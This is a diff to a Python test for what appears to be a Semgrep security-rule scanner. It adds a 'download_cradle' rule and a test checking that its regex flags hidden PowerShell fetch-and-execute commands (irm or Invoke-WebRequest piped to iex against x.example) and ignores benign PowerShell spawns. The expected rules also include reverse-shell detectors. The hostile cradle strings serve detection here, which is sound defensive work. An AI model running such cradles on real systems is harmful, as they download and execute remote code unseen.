@@ -11,6 +11,7 @@ test; the wheel is intentionally kept out of this lane. Enrolled in the
 from __future__ import annotations
 
 import json
+import re
 import subprocess
 from pathlib import Path
 from typing import Any
@@ -32,6 +33,7 @@ _EXPECTED_RULE_IDS = {
     "reverse_shell_pipe",
     "reverse_shell_spawn",
     "reverse_shell_ip_connect",
+    "download_cradle",
 }
 _RULES_FILE = (
     Path(semgrep_runner.__file__).resolve().parent
@@ -86,3 +88,28 @@ def test_benign_scan_is_silent(monkeypatch: pytest.MonkeyPatch) -> None:
     res = _run_with(monkeypatch, [])
     assert res.findings == []
     assert res.record.status == "ok"
+
+
+def test_download_cradle_pattern_regex_matches_cradle_not_benign() -> None:
+    """Validate the shipped ``download_cradle`` pattern-regex locally.
+
+    It is the one custom rule that matches on a raw regex rather than an AST
+    pattern, so the real fire is only exercised in the Semgrep container. Compiling
+    the YAML's ``pattern-regex`` (RE2 features used here are also valid Python re)
+    pins the pattern's logic — matches the ordered powershell->download->execute
+    cradle on one line, stays silent on a bare PowerShell spawn or scattered
+    tokens across lines (the GitHub.copilot-chat-style false-positive shape)."""
+    doc = yaml.safe_load(_RULES_FILE.read_text(encoding="utf-8"))
+    rule = next(r for r in doc["rules"] if r["id"] == "download_cradle")
+    pattern = re.compile(rule["patterns"][0]["pattern-regex"])
+
+    # Fires: the hidden-PowerShell irm/Invoke-WebRequest -> iex cradle on one line.
+    assert pattern.search(
+        'powershell -WindowStyle Hidden -Command "irm https://x.example/aaa | iex"'
+    )
+    assert pattern.search('pwsh -c "Invoke-WebRequest h | Invoke-Expression"')
+
+    # Silent: a bare powershell spawn (no cradle), and the four token classes
+    # scattered across separate lines (the loose-co-occurrence false positive).
+    assert not pattern.search('spawn("powershell.exe", ["-File", "./setup.ps1"])')
+    assert not pattern.search("powershell\nInvoke-WebRequest(url)\nlet iex = 0")
